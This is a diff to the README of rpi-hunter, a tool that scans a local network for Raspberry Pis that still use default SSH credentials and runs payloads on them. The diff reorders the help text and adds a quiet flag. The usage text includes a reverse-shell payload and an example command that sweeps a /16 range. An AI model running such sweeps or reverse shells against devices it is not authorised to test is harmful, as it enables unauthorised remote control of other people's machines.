@@ -17,20 +17,22 @@ rpi-hunter is  useful when there are multiple Raspberry Pi's on your LAN with de
 
 ## Usage
 ```
-usage: rpi-hunter.py [-h] [--no-scan] [-r IP_RANGE] [-f IP_LIST] [-c CREDS]
-                     [--list] [--payload PAYLOAD] [-H HOST] [-P PORT] [--safe]
+usage: rpi-hunter.py [-h] [--list] [--no-scan] [-r IP_RANGE] [-f IP_LIST]
+                     [-c CREDS] [--payload PAYLOAD] [-H HOST] [-P PORT]
+                     [--safe] [-q]
 
 optional arguments:
   -h, --help         show this help message and exit
+  --list             List avalible payloads
   --no-scan          Disable ARP scanning
   -r IP_RANGE        IP range to scan
   -f IP_LIST         IP list to use (Default ./scan/RPI_list)
   -c CREDS           Password to use when ssh'ing
-  --list             List avalible payloads
-  --payload PAYLOAD  (Name of or raw) Payload [ex. whoami or reverse_shell]
+  --payload PAYLOAD  (Name of, or raw) Payload [ex. reverse_shell or 'whoami']
   -H HOST            (If using reverse_shell payload) Host for reverse shell
   -P PORT            (If using reverse_shell payload) Port for reverse shell
   --safe             Print sshpass command, but don't execute it
+  -q                 Don't print banner
 ```
 * Example usage: `./rpi-hunter.py -r 192.168.0.0/16 --payload reverse_shell -H 127.0.0.1 -P 1337` 
 * Run `./rpi-hunter.py --list` to see avalible payloads.
